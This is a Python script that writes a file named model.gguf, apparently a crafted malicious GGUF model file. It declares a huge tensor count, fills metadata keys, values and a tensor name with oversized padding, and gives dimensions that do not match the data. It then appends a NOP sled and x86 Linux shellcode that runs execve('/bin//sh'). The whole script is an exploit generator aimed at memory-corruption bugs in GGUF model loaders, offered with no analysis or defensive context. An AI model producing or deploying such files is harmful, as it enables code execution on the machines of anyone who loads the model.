import os
import struct
import numpy as np

def create_gguf_header(tensor_count=1000000):
    header = bytearray()
    
    header.extend(b"GGUF")
    
    header.extend(struct.pack("<I", 2))
    
    header.extend(struct.pack("<Q", tensor_count))
    
    metadata_count = 5
    header.extend(struct.pack("<Q", metadata_count))
    
    for i in range(metadata_count):
        key = f"key_{i}_" + "A" * 1000  
        header.extend(struct.pack("<Q", len(key)))
        
        header.extend(key.encode())
        
        header.extend(struct.pack("<I", 3))
        
        value = "B" * 2000  
        header.extend(struct.pack("<Q", len(value)))
        
        header.extend(value.encode())
    
    return header

def create_tensor_data(size=1000):
    tensor_data = bytearray()
    
    tensor_name = "tensor_" + "X" * 500  
    tensor_data.extend(struct.pack("<Q", len(tensor_name)))
    
    tensor_data.extend(tensor_name.encode())
    
    dimensions = 2
    tensor_data.extend(struct.pack("<I", dimensions))
    
    for _ in range(dimensions):
        tensor_data.extend(struct.pack("<Q", size))
    
    tensor_data.extend(struct.pack("<I", 0))
    
    tensor_values = np.random.rand(10, 10).astype(np.float32)
    tensor_data.extend(tensor_values.tobytes())
    
    tensor_data.extend(b"\x90" * 100)  
    tensor_data.extend(b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80") 
    
    return tensor_data

def create_model_file():
    header = create_gguf_header()
    tensor_data = create_tensor_data()
    
    gguf_data = header + tensor_data
    
    output_dir = os.path.dirname(os.path.abspath(__file__))
    output_path = os.path.join(output_dir, "model.gguf")
    
    with open(output_path, "wb") as f:
        f.write(gguf_data)
    
    print(f"Model file created: {output_path}")

if __name__ == "__main__":
    create_model_file()
